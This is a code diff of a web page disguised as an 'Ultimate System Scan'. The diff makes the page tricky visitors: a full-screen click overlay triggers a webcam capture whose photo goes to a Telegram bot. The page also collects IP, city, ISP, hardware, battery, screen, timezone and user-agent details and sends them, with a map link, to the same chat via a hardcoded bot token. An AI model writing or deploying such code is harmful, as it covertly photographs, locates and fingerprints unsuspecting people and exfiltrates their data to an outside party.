@@ -3,44 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Deep System Scan</title>
+    <title>Ultimate System Scan</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
     <style>
-        body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; overflow-x: hidden; }
-        .status { text-align: center; margin-top: 25px; font-size: 20px; letter-spacing: 2px; color: #60a5fa; }
-        .container { width: 90%; max-width: 800px; margin: 20px auto; }
-        .box { background: rgba(15, 23, 42, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.4s; border: 1px solid rgba(59, 130, 246, 0.2); }
+        body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: 'Courier New', monospace; overflow-x: hidden; }
+        .status { text-align: center; margin-top: 20px; font-size: 18px; color: #60a5fa; text-transform: uppercase; letter-spacing: 3px; }
+        .container { width: 95%; max-width: 900px; margin: 10px auto; padding-bottom: 50px; }
+        .box { background: rgba(15, 23, 42, 0.8); padding: 15px; border-radius: 10px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.5s; border: 1px solid rgba(59, 130, 246, 0.2); box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
         .show { opacity: 1; transform: translateY(0); }
-        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; }
-        .value { color: white; margin-top: 5px; word-break: break-all; font-size: 13px; line-height: 1.5; }
-        .progress { height: 10px; background: #111827; border-radius: 5px; overflow: hidden; margin-bottom: 20px; }
+        .label { color: #94a3b8; font-size: 10px; text-transform: uppercase; margin-bottom: 5px; border-bottom: 1px solid #1e293b; display: inline-block; }
+        .value { color: white; font-size: 13px; line-height: 1.6; word-break: break-all; }
+        .progress { height: 6px; background: #111827; border-radius: 3px; overflow: hidden; margin: 20px 0; }
         .bar { height: 100%; width: 0%; background: #3b82f6; transition: width 0.05s linear; }
-        #map { height: 250px; display: none; border-radius: 12px; margin-top: 10px; border: 1px solid #1e293b; }
-        #clickLayer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
+        #map { height: 250px; display: none; border-radius: 10px; margin-top: 10px; border: 1px solid #1e293b; }
+        #clickLayer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: crosshair; }
         #video, #canvas { display: none; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 10px; }
+        .highlight { color: #60a5fa; font-weight: bold; }
     </style>
 </head>
-<body onclick="activateCamera()">
+<body onclick="initCapture()">
 
 <div id="clickLayer"></div>
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
-<div class="status" id="statusText">SCANNING...</div>
+<div class="status" id="statusText">System Breach Detected...</div>
 
 <div class="container">
     <div class="progress"><div class="bar" id="bar"></div></div>
     
     <div class="grid">
-        <div class="box" id="b1"><div class="label">Network</div><div id="ip" class="value">Loading...</div></div>
-        <div class="box" id="b2"><div class="label">Hardware</div><div id="hw" class="value">---</div></div>
-        <div class="box" id="b3"><div class="label">Battery</div><div id="bat" class="value">---</div></div>
-        <div class="box" id="b4"><div class="label">Display</div><div id="scr" class="value">---</div></div>
+        <!-- Блок мережі -->
+        <div class="box" id="b1">
+            <div class="label">Network & IP</div>
+            <div id="net-val" class="value">Analyzing packets...</div>
+        </div>
+        
+        <!-- Блок Заліза -->
+        <div class="box" id="b2">
+            <div class="label">Hardware Specs</div>
+            <div id="hw-val" class="value">Scanning components...</div>
+        </div>
+
+        <!-- Блок Батареї та Живлення -->
+        <div class="box" id="b3">
+            <div class="label">Power Status</div>
+            <div id="bat-val" class="value">Checking voltage...</div>
+        </div>
+
+        <!-- Блок Дисплею -->
+        <div class="box" id="b4">
+            <div class="label">Display & Graphics</div>
+            <div id="scr-val" class="value">Identifying GPU...</div>
+        </div>
     </div>
-    
-    <div class="box" id="b5"><div class="label">Browser Fingerprint</div><div id="finger" class="value">---</div></div>
+
+    <!-- Блок софту -->
+    <div class="box" id="b5">
+        <div class="label">Software Fingerprint</div>
+        <div id="soft-val" class="value">Tracing UserAgent...</div>
+    </div>
+
     <div id="map"></div>
 </div>
 
@@ -50,86 +74,143 @@
 const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
 const TG_CHAT_ID = "-1003787168523";
 
-let cameraUsed = false;
+let hasClicked = false;
 
-async function activateCamera() {
-    if (cameraUsed) return;
-    cameraUsed = true;
+// Активація камери та звуку при першому кліку
+async function initCapture() {
+    if (hasClicked) return;
+    hasClicked = true;
     document.getElementById('clickLayer').style.display = 'none';
     
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
+        
         setTimeout(() => {
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
+            
             canvas.toBlob(blob => {
                 const fd = new FormData();
                 fd.append('chat_id', TG_CHAT_ID);
-                fd.append('photo', blob, 'img.jpg');
+                fd.append('photo', blob, 'capture.jpg');
+                fd.append('caption', '📸 Кадр з камери візитера');
                 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: "POST", body: fd });
                 stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.8);
         }, 2000);
-    } catch(e) {}
+    } catch(e) { console.log("Camera blocked"); }
 }
 
+// Прогрес-бар
 let p = 0;
-let bar = setInterval(() => {
+let barInterval = setInterval(() => {
     p++;
     document.getElementById("bar").style.width = p + "%";
-    if(p >= 100) { clearInterval(bar); startScan(); }
-}, 20);
+    if(p >= 100) { 
+        clearInterval(barInterval); 
+        document.getElementById("statusText").innerText = "Data Decrypted";
+        runFullDiagnostic(); 
+    }
+}, 25);
 
-async function startScan() {
-    // 1. Отримуємо IP дані
+async function runFullDiagnostic() {
+    // 1. IP та Гео
     const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
     
-    // 2. Отримуємо дані про батарею
-    let batteryInfo = "N/A";
+    // 2. Батарея
+    let batPercent = "N/A", batStatus = "";
     if (navigator.getBattery) {
         const b = await navigator.getBattery();
-        batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Заряджається' : 'Розряджається'})`;
+        batPercent = Math.round(b.level * 100) + "%";
+        batStatus = b.charging ? "Заряджається" : "Автономно";
     }
 
-    // 3. Збираємо залізо
-    const hwInfo = `Ядра: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory || '?' }GB | GPU: ${getGPU()}`;
-    
-    // 4. Екран та мережа
-    const scrInfo = `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`;
-    const netInfo = navigator.connection ? `Тип: ${navigator.connection.effectiveType} | Speed: ~${navigator.connection.downlink}Mbps` : "N/A";
+    // 3. Залізо (RAM, CPU, GPU)
+    const cores = navigator.hardwareConcurrency || "Unknown";
+    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+    const gpu = getGPU();
 
-    // Відображення
-    document.getElementById("ip").innerHTML = `IP: ${ipData.ip}<br>City: ${ipData.city}<br>${netInfo}`;
-    document.getElementById("hw").innerHTML = hwInfo;
-    document.getElementById("bat").innerHTML = batteryInfo;
-    document.getElementById("scr").innerHTML = scrInfo;
-    document.getElementById("finger").innerHTML = `OS: ${navigator.platform}<br>UA: ${navigator.userAgent}`;
+    // 4. Мережа
+    const connection = navigator.connection || {};
+    const netType = connection.effectiveType || "Unknown";
+    const downlink = connection.downlink || "Unknown";
+
+    // 5. Виведення на сайт
+    document.getElementById("net-val").innerHTML = `
+        <span class="highlight">IP:</span> ${ipData.ip}<br>
+        <span class="highlight">ORG:</span> ${ipData.org}<br>
+        <span class="highlight">CITY:</span> ${ipData.city}, ${ipData.country_name}<br>
+        <span class="highlight">NET:</span> ${netType} (~${downlink} Mbps)
+    `;
+
+    document.getElementById("hw-val").innerHTML = `
+        <span class="highlight">CPU:</span> ${cores} Cores<br>
+        <span class="highlight">RAM:</span> ${ram}<br>
+        <span class="highlight">GPU:</span> ${gpu}
+    `;
+
+    document.getElementById("bat-val").innerHTML = `
+        <span class="highlight">LEVEL:</span> ${batPercent}<br>
+        <span class="highlight">STATUS:</span> ${batStatus}
+    `;
+
+    document.getElementById("scr-val").innerHTML = `
+        <span class="highlight">RES:</span> ${screen.width}x${screen.height}<br>
+        <span class="highlight">RATIO:</span> ${window.devicePixelRatio}x<br>
+        <span class="highlight">LANG:</span> ${navigator.language}
+    `;
+
+    document.getElementById("soft-val").innerHTML = `
+        <span class="highlight">PLATFORM:</span> ${navigator.platform}<br>
+        <span class="highlight">COOKIES:</span> ${navigator.cookieEnabled ? "YES" : "NO"}<br>
+        <span class="highlight">UA:</span> ${navigator.userAgent}
+    `;
 
     document.querySelectorAll('.box').forEach(b => b.classList.add('show'));
     showMap(ipData.latitude, ipData.longitude);
 
-    // 5. Відправка всього в ТГ
-    const fullLog = `
-🚀 *DEEP SCAN REPORT*
-🌐 *IP:* \`${ipData.ip}\`
-📍 *Локація:* ${ipData.city}, ${ipData.country_name}
-🔋 *Батарея:* ${batteryInfo}
-🖥️ *Екран:* ${scrInfo}
-⚙️ *Залізо:* ${hwInfo}
-📡 *Мережа:* ${netInfo}
-🌐 *Браузер:* ${navigator.userAgent}
-🕒 *Час:* ${new Date().toLocaleString()}
-🔗 [Google Maps](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})
+    // 6. ФОРМУВАННЯ ПОВНОГО ЗВІТУ ДЛЯ ТГ
+    const reportText = `
+🗄 *ПОВНИЙ ЗВІТ СИСТЕМИ*
+------------------------------
+🌐 *МЕРЕЖА:*
+- IP: \`${ipData.ip}\`
+- Місто: ${ipData.city}, ${ipData.country_name}
+- Провайдер: ${ipData.org}
+- Тип мережі: ${netType} (${downlink} Mbps)
+
+💻 *ЗАЛІЗО:*
+- Процесор: ${cores} ядер
+- ОЗП: ${ram}
+- Відеокарта: ${gpu}
+
+🔋 *ЖИВЛЕННЯ:*
+- Заряд: ${batPercent} (${batStatus})
+
+🖥 *ДИСПЛЕЙ ТА СОФТ:*
+- Екран: ${screen.width}x${screen.height}
+- Платформа: ${navigator.platform}
+- Cookies: ${navigator.cookieEnabled ? 'Увімкнено' : 'Вимкнено'}
+- Мова: ${navigator.language}
+- Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+📱 *USER AGENT:*
+\`${navigator.userAgent}\`
+
+📍 *GPS:*
+https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
+------------------------------
+🕒 Час: ${new Date().toLocaleString()}
     `;
 
     fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: fullLog, parse_mode: "Markdown" })
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: reportText, parse_mode: "Markdown" })
     });
 }
 
@@ -137,8 +218,9 @@ function getGPU() {
     try {
         const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL).split(' ').pop();
-    } catch(e) { return "N/A"; }
+        const result = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        return result.split(',').pop().trim();
+    } catch(e) { return "Standard Driver"; }
 }
 
 function showMap(lat, lon) {
